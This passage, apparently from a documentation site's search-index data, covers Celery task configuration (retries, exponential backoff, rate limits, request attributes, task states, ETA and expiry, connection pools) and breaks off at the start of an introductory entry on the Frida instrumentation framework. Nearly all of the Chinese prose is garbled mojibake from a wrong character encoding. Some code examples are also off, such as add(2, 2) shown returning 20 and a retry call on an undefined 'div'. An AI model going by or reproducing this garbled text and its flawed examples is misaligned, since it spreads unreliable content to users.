å¼‚å¸¸ã€‚åœ¨å¼‚å¸¸æ—¶ä¸ä¼šè‡ªåŠ¨é‡è¯•ï¼Œæ‰€ä»¥å¿…é¡»æ‰‹åŠ¨è°ƒç”¨ retry()ã€‚ é»˜è®¤å€¼é‡è¯•æ¬¡æ•°ä¸º3æ¬¡ï¼Œå¦‚æœè®¾ç½®ä¸º None ä¼šå…³é—­é‡è¯•é™åˆ¶ï¼Œç›´åˆ°ä»»åŠ¡æ‰§è¡ŒæˆåŠŸä¸ºæ­¢ã€‚ é€Ÿç‡é™åˆ¶ä¹Ÿå¯ä»¥åœ¨æ•°å€¼åé¢æ·»åŠ  \"/s\"ã€\"/m\" æˆ– \"/h\"ï¼Œä»¥ç§’ã€åˆ†é’Ÿæˆ–ä»¥å°æ—¶ä¸ºå•ä½ã€‚ä»»åŠ¡å°†åœ¨æŒ‡å®šçš„æ—¶é—´å†…å¹³å‡åˆ†é…ã€‚ ä¾‹å¦‚: \"100/m\" ï¼ˆæ¯åˆ†é’Ÿ100ä¸ªä»»åŠ¡ï¼‰ã€‚åˆ™å¼ºåˆ¶ä¼šåœ¨åŒä¸€ä¸ªèŒç¨‹ï¼ˆWorkerï¼‰å®ä¾‹ä¸Šå¯åŠ¨ä¿©ä¸ªä»»åŠ¡ä¹‹é—´è‡³å°‘ 600ms çš„å»¶è¿Ÿã€‚ é»˜è®¤å€¼é€šè¿‡ task_default_rate_limit è¿›è¡Œè®¾å®šï¼šå¦‚æœæœªæŒ‡å®šï¼Œè¡¨ç¤ºé»˜è®¤æƒ…å†µç¦ç”¨ä»»åŠ¡çš„é€Ÿç‡é™åˆ¶ã€‚ æ³¨æ„ï¼Œè¯¥é€Ÿç‡é™åˆ¶ä¸ºæ¯ä¸€ä¸ªèŒç¨‹ï¼ˆWorkerï¼‰å®ä¾‹çš„é™åˆ¶ï¼Œå¹¶éå…¨å±€é€Ÿç‡é™åˆ¶ã€‚é…ç½®å…¨å±€é€Ÿç‡é™åˆ¶ï¼ˆä¾‹å¦‚ï¼ŒAPIæ¯ç§’æœ€å¤šè¯·æ±‚çš„æ¬¡æ•°ï¼‰ï¼Œå¿…é¡»åˆ¶å®šé˜Ÿåˆ—ã€‚ default_retry_delay: Union[int, float] = 30 * 60 å¦‚æœä»»åŠ¡éœ€è¦é‡è¯•, è®¾ç½®æ¯æ¬¡é‡è¯•ä¹‹é—´çš„é—´éš”æ—¶é—´. å•ä½: ç§’(s) autoretry_for: ä»»åŠ¡å¤±è´¥æ—¶é‡è¯•, ç›¸å…³çš„é…ç½®. å¼‚å¸¸ç±»çš„åˆ—è¡¨æˆ–å…ƒç»„ï¼Œå¦‚æœä»»åŠ¡åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å¼•å‘å¼‚å¸¸ï¼Œä»»åŠ¡å°†è‡ªåŠ¨é‡è¯•ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä¼šè‡ªåŠ¨é‡è¯•ä»»ä½•å¼‚å¸¸ã€‚ è§ autoretry_for retry_kwargs: dict ä»»åŠ¡å¤±è´¥é‡è¯•æ—¶ç›¸å…³é…ç½®. è‡ªå®šä¹‰é…ç½®è‡ªåŠ¨é‡è¯•å‚æ•°ã€‚ æ³¨æ„ï¼Œå¦‚æœä½¿ç”¨ä¸‹é¢çš„ exponential backoff é€‰é¡¹æ˜¯ï¼Œ countdown ä»»åŠ¡é€‰é¡¹å°†ç”± Celery çš„è‡ªåŠ¨é‡è¯•ç³»ç»Ÿå†³å®šï¼Œå­—å…¸ä¸­åŒ…å« countdown ä¼šè¢«å¿½ç•¥ã€‚ è§ retry_kwargs retry_backoff: Union[int, bool] = False å¦‚æœå°†æ­¤é€‰é¡¹è®¾ç½®ä¸ºTrueï¼Œåˆ™è‡ªåŠ¨é‡è¯•å°†æŒ‰ç…§ exponential backoff è§„åˆ™å»¶è¿Ÿã€‚ ç¬¬ä¸€æ¬¡é‡è¯•å»¶è¿Ÿ 1 ç§’ï¼Œç¬¬äºŒæ¬¡é‡è¯•å»¶è¿Ÿ 2 ç§’ï¼Œç¬¬ä¸‰æ¬¡å»¶è¿Ÿ 4 ç§’ï¼Œç¬¬å››æ¬¡å»¶è¿Ÿ 8 ç§’ï¼Œä»¥æ­¤ç±»æ¨ã€‚ ï¼ˆå¦‚æœå¯ç”¨äº† retry_jitter ä¼šä¿®æ”¹å»¶è¿Ÿå€¼ï¼‰ã€‚ å¦‚æœè¯¥é€‰é¡¹è®¾ç½®ä¸ºæ•°å­—ï¼Œåˆ™ä½œä¸ºå»¶è¿Ÿå› å­. ä¾‹å¦‚ï¼Œè¯¥é€‰é¡¹è®¾ç½®ä¸º 3ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡é‡è¯•å°†å»¶è¿Ÿ 3 ç§’ï¼Œç¬¬äºŒæ¬¡å°†å»¶è¿Ÿ 6 ç§’ï¼Œç¬¬ä¸‰æ¬¡å»¶è¿Ÿ 12 ç§’ï¼Œç¬¬å››æ¬¡å»¶è¿Ÿ 24ç§’ï¼Œä»¥æ­¤ç±»æ¨ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥é€‰é¡¹è®¾ç½®ä¸º Falseï¼Œè‡ªåŠ¨é‡è¯•ä¸ä¼šå»¶è¿Ÿã€‚ retry_backoff_max: int = 600 å¦‚æœå¯åŠ¨äº† retry_backoffï¼Œè¯¥é€‰é¡¹åœ¨ä»»åŠ¡è‡ªåŠ¨é‡è¯•ä¹‹é—´è®¾ç½®ä»¥ç§’ä¸ºå•ä½çš„æœ€å¤§å»¶è¿Ÿã€‚ é»˜è®¤æƒ…å†µï¼Œè¯¥é€‰é¡¹é»˜è®¤å€¼ä¸º 600ï¼Œå³ 10åˆ†é’Ÿã€‚ retry_jitter: bool = True Jitter ç”¨äºéšæœºæ€§å¼•å…¥æŒ‡æ•°å›é€€å»¶è¿Ÿï¼Œé˜²æ­¢é˜Ÿåˆ—ä¸­æ‰€æœ‰ä»»åŠ¡åŒæ—¶æ‰§è¡Œ. å¦‚æœè¯¥é€‰é¡¹è®¾ç½®ä¸º Trueï¼Œåˆ™å°† retry_backoff è®¡ç®—çš„å»¶è¿Ÿä½œä¸ºæœ€å¤§å€¼ï¼Œå®é™…çš„å»¶è¿Ÿå€¼ä¸ºä¸€ä¸ªä»‹äº 0 å’Œæœ€å¤§å€¼ä¹‹é—´çš„ä¸€ä¸ªéšæœºæ•°ã€‚ retry ä»»åŠ¡å¤±è´¥æ—¶çš„é‡è¯• å½“è°ƒç”¨ retry æ—¶ï¼Œä¼šå‘é€ä¸åŸå§‹ä»»åŠ¡ç›¸åŒçš„IDå‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œå°†è¯¥æ¶ˆæ¯å‘é€åˆ°åŸå§‹ä»»åŠ¡çš„å¯¹åˆ—ä¸­ã€‚ å½“ä»»åŠ¡è¢«é‡è¯•æ—¶ï¼Œä¹Ÿä¼šè¢«è®°å½•ä¸ºä¸€ä¸ªä»»åŠ¡çŠ¶æ€ï¼Œä¾¿äºé€šè¿‡ result å®ä¾‹æ¥è·Ÿè¸ªä»»åŠ¡ã€‚ ä¾‹: @app.task(bind=True) def send_twitter_status(self, oauth, tweet): try: twitter = Twitter(oauth) twitter.update_status(tweet) except (Twitter.FailWhaleError, Twitter.LoginError) as exc: raise self.retry(exc=exc) exc å‚æ•°ä¸»è¦ç”¨ä¼ é€’æ—¥å¿—å’Œå­˜å‚¨ä»»åŠ¡ç»“æœæ—¶çš„ä½¿ç”¨çš„å¼‚å¸¸ä¿¡æ¯ã€‚exception å’Œ traceback éƒ½å°†åœ¨ä»»åŠ¡çŠ¶æ€ä¸­å¯ç”¨(å¦‚æœå¯ç”¨äº†ç»“æœåç«¯)ã€‚ ä»»åŠ¡å¦‚æœæœ‰ä¸€ä¸ª max_retries å€¼ï¼Œè¶…å‡ºäº†é‡è¯•çš„æœ€å¤§æ¬¡æ•°ï¼Œåˆ™ä¼šé‡æ–°å¼•å‘å½“å‰çš„å¼‚å¸¸ä¿¡æ¯ï¼Œä½†å¦‚æœ: exc å‚æ•°æ²¡æœ‰è®¾ç½® è¯¥æƒ…å†µä¼šå¼•å‘ MaxRetriesExceededError å¼‚å¸¸ æ²¡æœ‰å¼‚å¸¸ å¦‚æœæ²¡æœ‰åˆå§‹å¼‚å¸¸æ¥é‡æ–°å¼•å‘excå‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨: self.retry(exc=Twitter.LoginError()) è®¾ç½® exc å‚æ•°å€¼ request ä»»åŠ¡è¯·æ±‚ï¼šTask Request app.Task.request åŒ…å«ä¸å½“å‰æ‰§è¡Œä»»åŠ¡ç›¸å…³çš„ä¿¡æ¯å’ŒçŠ¶æ€ã€‚ è¯¥è¯·æ±‚å®šä¹‰äº†ä»¥ä¸‹å±æ€§: å±æ€§åç§° è¯´æ˜ id æ‰§è¡Œä»»åŠ¡çš„å”¯ä¸€ID group ä»»åŠ¡ç»„çš„å”¯ä¸€IDï¼ˆè¯¥ä»»åŠ¡æ˜¯ç»„æˆå‘˜çš„æƒ…å†µä¸‹ï¼‰ chord æ­¤ä»»åŠ¡æ‰€å±çš„å’Œå¼¦çš„æƒŸä¸€id(å¦‚æœè¯¥ä»»åŠ¡æ˜¯æ ‡é¢˜çš„ä¸€éƒ¨åˆ†) correlation_id ç”¨äºé‡å¤æ•°æ®åˆ é™¤çš„è‡ªå®šä¹‰ID args é€‰é¡¹å‚æ•° kwargs å…³é”®å­—å‚æ•° origin å‘é€ä»»åŠ¡çš„ä¸»æœºå retries ä»»åŠ¡é‡è¯•æ¬¡æ•°ï¼Œé»˜è®¤æ˜¯ä» 0 å¼€å§‹çš„ is_eager å¦‚æœä»»åŠ¡æ˜¯ç”±å®¢æˆ·ç«¯æ‰§è¡Œï¼Œå¹¶éèŒç¨‹ï¼ˆWorkerï¼‰æ‰§è¡Œï¼Œè®¾ç½® True expires ä»»åŠ¡é¢„è®¡æ—¶é—´ï¼ˆå¦‚æœå·²ç»è®¾ç½®çš„æƒ…å†µä¸‹ï¼‰ï¼Œæ—¶é—´ä¸º UTC æ ¼å¼ï¼ˆå–å†³äº enable_utc è®¾ç½®ï¼‰ hostname æ‰§è¡Œä»»åŠ¡çš„èŒç¨‹ï¼ˆWorkerï¼‰å®ä¾‹çš„èŠ‚ç‚¹å delivery_info æ·»åŠ é™„åŠ ä¼ é€’æ¶ˆæ¯ï¼Œä¸»è¦ç”¨äºåŒ…å«äº¤ä»˜ä»»åŠ¡çš„äº¤æ¢å’Œè·¯ç”±é”®çš„æ˜ å°„ï¼Œretry() ä¸»è¦ç”¨äºé‡æ–°è®²ä»»åŠ¡ä¸‹å‘åˆ°é˜Ÿåˆ—ä¸­ï¼Œè¯¥ dict ä¸­çš„é”®å¯ç”¨å–å†³äºä½¿ç”¨çš„æ¶ˆæ¯ä¸­é—´äººï¼ˆBrokerï¼‰ã€‚ reply-to å›å¤çš„å‘é€çš„é˜Ÿåˆ—åç§°ï¼ˆä¾‹å¦‚ï¼Œä¸ RPC ç»“æœåç«¯ä¸€èµ·ä½¿ç”¨ï¼‰ called_directly å¦‚æœèŒç¨‹ï¼ˆWorkerï¼‰æœªæ‰§è¡Œä»»åŠ¡ï¼Œåˆ™æ­¤æ ‡å¿—è®¾ç½®ä¸ºtrue timelimit å½“å‰(è½¯ã€ç¡¬)æ—¶é—´é™åˆ¶çš„å…ƒç»„(å¦‚æœæœ‰çš„è¯) callbacks å¦‚æœæ­¤ä»»åŠ¡æˆåŠŸè¿”å›ï¼Œå°†è°ƒç”¨çš„ç­¾ååˆ—è¡¨ errback å¦‚æœæ­¤ä»»åŠ¡å¤±è´¥ï¼Œå°†è°ƒç”¨çš„ç­¾ååˆ—è¡¨ utc è®¾ç½®ä¸º true ï¼Œå¯ç”¨ UTC headers ä¸ä»»åŠ¡æ¶ˆæ¯ä¸€èµ·å‘é€çš„æ¶ˆæ¯å¤´çš„æ˜ å°„ï¼ˆå¯ä»¥ä¸º Noneï¼‰ reply_to å›å¤çš„åœ°å€ï¼ˆé˜Ÿåˆ—åç§°ï¼‰ correlation_id ä¸€èˆ¬ä¸ä»»åŠ¡çš„IDç›¸åŒï¼Œé€šå¸¸ç”¨äºAMQPä¸­è·Ÿè¸ªå›å¤çš„å†…å®¹ root_id æ­¤ä»»åŠ¡æ‰€å±å·¥ä½œæµä¸­çš„ç¬¬ä¸€ä¸ªä»»åŠ¡çš„å”¯ä¸€IDï¼ˆå¦‚æœæœ‰ï¼‰ parent_id è°ƒç”¨æ­¤ä»»åŠ¡çš„ä»»åŠ¡çš„æƒŸä¸€idï¼ˆå¦‚æœæœ‰ï¼‰ chain åè½¬å½¢æˆé“¾çš„ä»»åŠ¡åˆ—è¡¨ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚åˆ—è¡¨ä¸­æœ€åä¸€ä¸ªä»»åŠ¡æ˜¯å½“å‰ä»»åŠ¡æ‰§è¡ŒæˆåŠŸä¹‹åçš„ä¸‹ä¸€ä¸ªä»»åŠ¡ã€‚å¦‚æœä½¿ç”¨ä»»åŠ¡åè®®çš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼Œåˆ™é“¾ä»»åŠ¡å°†ä½äº request.callbacks ä¸­ æ¡ˆä¾‹ è®¿é—®ä¸Šä¸‹æ–‡è®¿é—®ä¿¡æ¯çš„ä¸€ä¸ªä»»åŠ¡æ¡ˆä¾‹: @app.task(bind=True) def dump_context(self, x, y): print('Executing task id {0.id}, args: {0.args!r} kwargs: {0.kwargs!r}'.format( self.request)) bind å‚æ•°è¡¨ç¤ºè¯¥å‡½æ•°ç»‘æ˜¯ä¸€ä¸ªç»‘å®šæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡è®¿é—®ä»»åŠ¡ç±»å‹å®ä¾‹ä¸­çš„å±æ€§å’Œæ–¹æ³•ã€‚ ä»»åŠ¡é‡è¯• ä½¿ç”¨è£…é¥°å™¨å‚æ•°çš„æ–¹å¼ æœ‰æ—¶ï¼Œæ‚¨åªæƒ³åœ¨å¼•å‘ç‰¹å®šå¼‚å¸¸æ—¶é‡è¯•ä»»åŠ¡ã€‚ å¯ä¹Ÿé€šè¿‡ Celery ä¸­ task() è£…é¥°å™¨ä¸­çš„ autoretry_for å‚æ•°è¿›è¡Œè‡ªåŠ¨é‡è¯•ä»»åŠ¡: from twitter.exceptions import FailWhaleError @app.task(autoretry_for=(FailWhaleError,)) def refresh_timeline(user): return twitter.refresh_timeline(user) å¯ä»¥é€šè¿‡ task() ä¸­çš„ retry_kwargs å‚æ•°æ¥æŒ‡å®š retry() å†…éƒ¨è°ƒç”¨å‚æ•°: @app.task(autoretry_for=(FailWhaleError,), retry_kwargs={'max_retries': 5}) def refresh_timeline(user): return twitter.refresh_timeline(user) ä¸Šé¢çš„ç¤ºä¾‹ä¸åœ¨ try ... except è¯­å¥ä¸­åŒ…å«çš„ä»£ç å—ä½¿ç”¨ retry æ•ˆæœä¸€è‡´: @app.task def refresh_timeline(user): try: twitter.refresh_timeline(user) except FailWhaleError as exc: raise div.retry(exc=exc, max_retries=5) å¦‚æœä½ æƒ³è‡ªåŠ¨é‡è¯•ä»»ä½•é”™è¯¯ï¼Œåªéœ€ä½¿ç”¨: @app.task(autoretry_for=(Exception,)) def x(): ... æ‰‹åŠ¨æ•è·çš„æ–¹å¼ è§ retry ä»»åŠ¡çŠ¶æ€ å†…ç½®çŠ¶æ€ PENDING ä»»åŠ¡æ­£åœ¨ç­‰å¾…æ‰§è¡Œæˆ–æœªçŸ¥ã€‚ä»»ä½•æœªçŸ¥çš„ä»»åŠ¡ ID éƒ½é»˜è®¤å¤„äºæŒ‚èµ·çŠ¶æ€ã€‚ STARTED ä»»åŠ¡å·²ç»å¼€å§‹ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä¼šè®°å½•ï¼Œéœ€è¦å¯ç”¨ï¼Œè¯·å‚é˜… app.Task.track_started.ã€‚ meta-dataï¼šæ­£åœ¨æ‰§è¡Œä»»åŠ¡çš„èŒç¨‹ï¼ˆWorkerï¼‰ pid å’Œä¸»æœºåã€‚ SUCCESS ä»»åŠ¡æ‰§è¡ŒæˆåŠŸã€‚ meta-dataï¼šä»»åŠ¡ç»“æœè¿”å›å€¼ propagatesï¼šYes ready: Yes FAILURE ä»»åŠ¡æ‰§è¡Œå¤±è´¥ã€‚ meta-dataï¼šæ‰§è¡Œå¼‚å¸¸æ—¶çš„ä»»åŠ¡ä¿¡æ¯ï¼Œå…¶ä¸­ traceback åŒ…å«å¼•å‘é”™è¯¯çš„å †æ ˆä¿¡æ¯ã€‚ propagatesï¼šYes RETRY ä»»åŠ¡å¤„äºé‡è¯•çŠ¶æ€ã€‚ meta-dataï¼šç»“æœä¿¡æ¯åŒ…å«å¯¼è‡´é‡è¯•çš„å¼‚å¸¸ä¿¡æ¯ï¼Œtraceback åŒ…å«å¼•å‘å¼‚å¸¸æ—¶å †æ ˆçš„å›æº¯ã€‚ propagatesï¼šNo REVOKED ä»»åŠ¡è¢«æ’¤é”€ã€‚ propagatesï¼šYes è‡ªå®šä¹‰çŠ¶æ€ ä½¿ç”¨ update_state() æ›´æ–°ä»»åŠ¡çŠ¶æ€ åªéœ€è¦è®¾ç½®ä¸€ä¸ªä½ç½®çš„åç§°ï¼Œå°±å¯ä»¥è½»æ¾çš„è‡ªå®šä¹‰çŠ¶æ€ï¼ŒçŠ¶æ€åé€šå¸¸æ˜¯å¤§å†™çš„å­—ç¬¦ä¸²ã€‚ ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹å®šä¹‰è‡ªå®šä¹‰ä¸­æ­¢çŠ¶æ€çš„å¯ä¸­æ­¢ä»»åŠ¡: @app.task(bind=True) def upload_files(self, filenames): for i, file in enumerate(filenames): if not self.request.called_directly: self.update_state(state='PROGRESS', meta={'current': i, 'total': len(filenames)}) åœ¨è¿™é‡Œï¼Œåˆ›å»ºäº†ä¸€ä¸ªåç§°ä¸º\" PROGRESS\"çš„çŠ¶æ€ï¼Œé€šè¿‡ current å’Œ total ä½œä¸ºå…ƒæ•°æ®çš„ä¸€éƒ¨åˆ†ï¼Œ è®¡ç®—ä»»åŠ¡å½“å‰æ­£åœ¨è¿›è¡ŒçŠ¶æ€çš„ä»»ä½•åº”ç”¨ç¨‹åºä»¥åŠä»»åŠ¡åœ¨è¿›ç¨‹ä¸­ä½ç½®ã€‚å¯ä»¥é€šè¿‡è¯¥æ–¹æ³•æ¥åˆ›å»ºä»»åŠ¡è¿›åº¦æ¡ã€‚ è‡ªå®šä¹‰ä»»åŠ¡ç±» æ‰€æœ‰çš„ä»»åŠ¡éƒ½ç»§æ‰¿ app.Task ç±»ï¼Œrun() æ–¹æ³•ä¸ºä»»åŠ¡ä½“ã€‚ ä¾‹å¦‚: @app.task def add(x, y): return x + y åœ¨å†…éƒ¨å¤§æ¦‚ä¼šæ˜¯è¿™æ ·: class _AddTask(app.Task): def run(self, x, y): return x + y add = app.tasks[_AddTask.name] ä»»åŠ¡è°ƒç”¨ apply_async , å‘é€ä¸€ä¸ªä»»åŠ¡æ¶ˆæ¯ delay , ç›´æ¥å‘é€ä¸€ä¸ªä»»åŠ¡æ¶ˆæ¯,ä½†æ˜¯ä¸æ”¯æŒè¿è¡Œå‚æ•° calling , åº”ç”¨ä¸€ä¸ªæ”¯æŒè°ƒç”¨æ¥å£ï¼ˆä¾‹å¦‚ï¼Œadd(2,2)ï¼‰çš„å¯¹è±¡, æ„å‘³ç€ä»»åŠ¡ä¸ä¼šè¢«ä¸€ä¸ª worker æ‰§è¡Œ,ä½†æ˜¯ä¼šåœ¨å½“å‰çº¿ç¨‹ä¸­æ‰§è¡Œ(ä½†æ˜¯æ¶ˆæ¯ä¸ä¼šè¢«å‘é€) apply_async delay calling ä»»åŠ¡å›è°ƒ taskæ”¯æŒçš„å‡½æ•°å›è°ƒ after_return ä»»åŠ¡è¿”å›åè°ƒç”¨çš„å¤„ç†ç¨‹åº on_failure ä»»åŠ¡æ‰§è¡Œå¤±è´¥æ—¶ï¼Œç”±èŒç¨‹ï¼ˆWorkerï¼‰è°ƒç”¨ã€‚ on_retry ä»»åŠ¡é‡è¯•æ—¶ï¼Œç”±èŒç¨‹ï¼ˆWorkerï¼‰è°ƒç”¨ã€‚ on_success ä»»åŠ¡æˆåŠŸæ—¶ï¼Œç”±èŒç¨‹ï¼ˆWorkerï¼‰è°ƒç”¨ã€‚ after_return on_failure on_retry on_success è·å–å›è°ƒæ”¹å˜/çŠ¶æ€-on_message Celery å¯ä»¥é€šè¿‡æ¶ˆæ¯å›è°ƒè·å–æ‰€æœ‰çŠ¶æ€çš„æ”¹å˜ã€‚ä¾‹å¦‚å¯¹äºé•¿æ—¶ä»»åŠ¡å‘é€äººä»»åŠ¡è¿›ç¨‹ï¼Œä½ å¯ä»¥è¿™æ ·åš: @app.task(bind=True) def hello(self, a, b): time.sleep(1) self.update_state(state=\"PROGRESS\", meta={'progress': 50}) time.sleep(1) self.update_state(state=\"PROGRESS\", meta={'progress': 90}) time.sleep(1) return 'hello world: %i' % (a+b) def on_raw_message(body): print(body) r = hello.apply_async(4, 6) print(r.get(on_message=on_raw_message, propagate=False)) å°†ç”Ÿæˆå¦‚ä¸‹è¾“å‡º: {'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7', 'result': {'progress': 50}, 'children': [], 'status': 'PROGRESS', 'traceback': None} {'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7', 'result': {'progress': 90}, 'children': [], 'status': 'PROGRESS', 'traceback': None} {'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7', 'result': 'hello world: 10', 'children': [], 'status': 'SUCCESS', 'traceback': None} hello world: 10 é™åˆ¶æ—¶é—´-ETA and Countdown ETA (estimated time of arrival, é¢„è®¡åˆ°åº•æ—¶é—´) è®©ä½ è®¾ç½®ä¸€ä¸ªæ—¥æœŸå’Œæ—¶é—´ï¼Œåœ¨è¿™ä¸ªæ—¶é—´ä¹‹å‰ä»»åŠ¡å°†è¢«æ‰§è¡Œã€‚ countdown æ˜¯ä¸€ç§ä»¥ç§’ä¸ºå•ä½è®¾ç½®ETAçš„å¿«æ·æ–¹å¼: >>> result = add.apply_async((2, 2), countdown=3) >>> result.get() # this takes at least 3 seconds to return 20 ç¡®ä¿ä»»åŠ¡åœ¨æŒ‡å®šçš„æ—¥æœŸå’Œæ—¶é—´ä¹‹åçš„æŸä¸ªæ—¶é—´æ‰§è¡Œï¼Œä½†ä¸ä¸€å®šåœ¨è¯¥æ—¶é—´æ‰§è¡Œã€‚ å¯èƒ½åŸå› å¯èƒ½åŒ…æ‹¬è®¸å¤šé¡¹ç›®åœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…ï¼Œæˆ–è€…ä¸¥é‡çš„ç½‘ç»œå»¶è¿Ÿã€‚ä¸ºäº†ç¡®ä¿æ‚¨çš„ä»»åŠ¡åŠæ—¶æ‰§è¡Œï¼Œä½ åº”è¯¥ç›‘è§†é˜Ÿåˆ—ä¸­çš„æ‹¥å¡æƒ…å†µã€‚ ä½¿ç”¨Muninæˆ–ç±»ä¼¼å·¥å…·æ¥æ¥æ”¶è­¦æŠ¥ï¼Œå› æ­¤å¯ä»¥é‡‡å–é€‚å½“çš„æªæ–½æ¥å‡è½»è´Ÿè½½ã€‚ç‚¹å‡»æŸ¥çœ‹Muninã€‚ å°½ç®¡ countdown æ˜¯æ•´æ•°ï¼Œä½†etaå¿…é¡»æ˜¯ä¸€ä¸ª datetime å¯¹è±¡ï¼Œå¹¶æŒ‡å®šç¡®åˆ‡çš„æ—¥æœŸå’Œæ—¶é—´ï¼ˆåŒ…æ‹¬æ¯«ç§’ç²¾åº¦å’Œæ—¶åŒºä¿¡æ¯ï¼‰: >>> from datetime import datetime, timedelta >>> tomorrow = datetime.utcnow() + timedelta(days=1) >>> add.apply_async((2, 2), eta=tomorrow) expries å‚æ•°å®šä¹‰äº†ä¸€ä¸ªå¯é€‰çš„åˆ°æœŸæ—¶é—´ï¼Œæ—¢å¯ä»¥ä½œä¸ºä»»åŠ¡ä¹‹åç§’å‘å¸ƒï¼Œæˆ–åœ¨ç‰¹å®šæ—¥æœŸå’Œæ—¶é—´ä½¿ç”¨ datetime: >>> # Task expires after one minute from now. >>> add.apply_async((10, 10), expires=60) >>> # Also supports datetime >>> from datetime import datetime, timedelta >>> add.apply_async((10, 10), kwargs, ... expires=datetime.now() + timedelta(days=1) å½“ worker æ”¶åˆ°è¿‡æœŸçš„ä»»åŠ¡æ—¶ï¼Œå®ƒå°†ä»»åŠ¡æ ‡è®°ä¸ºREVOKED åˆ›å»ºè¿æ¥æ±  è‡ªåŠ¨æ± æ”¯æŒ ä»2.3ç‰ˆå¼€å§‹ï¼Œæ”¯æŒè‡ªåŠ¨è¿æ¥æ± ï¼Œå› æ­¤æ‚¨ä¸å¿…æ‰‹åŠ¨å¤„ç†è¿æ¥å’Œå‘å¸ƒè€…å³å¯é‡ç”¨è¿æ¥ã€‚ ä»2.5ç‰ˆå¼€å§‹ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ç”¨è¿æ¥æ± ã€‚ æ‚¨å¯ä»¥é€šè¿‡åˆ›å»ºå‘å¸ƒè€…æ¥æ‰‹åŠ¨å¤„ç†è¿æ¥: results = [] with add.app.pool.acquire(block=True) as connection: with add.get_publisher(connection) as publisher: try: for args in numbers: res = add.apply_async((2, 2), publisher=publisher) results.append(res) print([res.get() for res in results]) å°½ç®¡è¿™æ˜¯ä¸ªç‰¹å®šç¤ºä¾‹ï¼Œä½†æ˜¯å¯ä»¥æ›´å¥½çš„å±•ç°ä¸€ç»„: >>> from celery import group >>> numbers = [(2, 2), (4, 4), (8, 8), (16, 16)] >>> res = group(add.s(i, j) for i, j in numbers).apply_async() >>> res.get() [4, 8, 16, 32]","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-task.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-task.html"},{"title":"frida","text":"å®˜ç½‘: https://frida.re/docs/home/ å®‰è£…: pip install frida fridaæ˜¯ä¸€æ¬¾åŸºäºpython + javascript çš„hookæ¡†æ¶ï¼Œ å¯è¿è¡Œåœ¨androidioslinuxwinosxç­‰å„å¹³å°ï¼Œä¸»è¦ä½¿ç”¨åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©æŠ€æœ¯ æ’æ¡©æŠ€æœ¯ æ’æ¡©æŠ€æœ¯æ˜¯æŒ‡å°†é¢å¤–çš„ä»£ç æ³¨å…¥ç¨‹åºä¸­ä»¥æ”¶é›†è¿è¡Œæ—¶çš„ä¿¡æ¯ï¼Œå¯åˆ†ä¸ºä¸¤ç§ï¼š æºä»£ç æ’æ¡©[Source Code Instrumentation(SCI)]ï¼šé¢å¤–ä»£ç æ³¨å…¥åˆ°ç¨‹åºæºä»£ç ä¸­ äºŒè¿›åˆ¶æ’æ¡©ï¼ˆBinary Instrumentationï¼‰ï¼šé¢å¤–ä»£ç æ³¨å…¥åˆ°äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ é™æ€äºŒè¿›åˆ¶æ’æ¡©[Static Binary Instrumentation(SBI)]ï¼š åœ¨ç¨‹åºæ‰§è¡Œå‰æ’å…¥é¢å¤–çš„ä»£ç å’Œæ•°æ®ï¼Œç”Ÿæˆä¸€ä¸ªæ°¸ä¹…æ”¹å˜çš„å¯æ‰§è¡Œæ–‡ä»¶ åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©[Dynamic Binary Instrumentation(DBI)]ï¼š åœ¨ç¨‹åºè¿è¡Œæ—¶å®æ—¶åœ°æ’å…¥é¢å¤–ä»£ç å’Œæ•°æ®ï¼Œå¯¹å¯æ‰§è¡Œæ–‡ä»¶æ²¡æœ‰ä»»ä½•æ°¸ä¹…æ”¹å˜ã€‚ Frida æ˜¯ä¸€ä¸ªç”¨äºåŠ¨æ€åˆ†æå’Œä¿®æ”¹åº”ç”¨ç¨‹åºçš„å·¥å…·ï¼Œ å®ƒæä¾›äº†ä¸€ç§åœ¨è¿è¡Œæ—¶æ³¨å…¥ä»£ç åˆ°ç›®æ ‡åº”ç”¨ç¨‹åºä¸­çš„æ–¹å¼ã€‚ åœ¨ Python ä¸­ï¼ŒFrida æä¾›äº†ä¸€ä¸ªåä¸º \"frida\" çš„æ¨¡å—ï¼Œç”¨äºä¸ Frida è¿è¡Œæ—¶è¿›è¡Œäº¤äº’ã€‚ ä½¿ç”¨ Fridaï¼Œä½ å¯ä»¥åœ¨ç›®æ ‡åº”ç”¨ç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ä¸­å®æ—¶åœ°ç›‘è§†å’Œä¿®æ”¹å‡½æ•°è°ƒç”¨ã€ä¿®æ”¹å†…å­˜ä¸­çš„æ•°æ®ã€æ‹¦æˆªç½‘ç»œé€šä¿¡ç­‰ã€‚ å®ƒæ”¯æŒå¤šç§å¹³å°ï¼ŒåŒ…æ‹¬ Androidã€iOSã€Windowsã€macOS å’Œ Linuxã€‚ åœ¨ Python ä¸­ï¼Œé€šè¿‡å¯¼å…¥ \"frida\" æ¨¡å—ï¼Œ ä½ å¯ä»¥ç¼–å†™ä»£ç æ¥åˆ›å»º Frida ä¼šè¯ã€åŠ è½½ç›®æ ‡åº”ç”¨ç¨‹åºã€æ³¨å…¥ JavaScript æˆ–è€…ä½¿ç”¨ Python API è¿›è¡Œäº¤äº’ã€‚ è¿™ä½¿å¾—ä½ å¯ä»¥åˆ©ç”¨ Frida 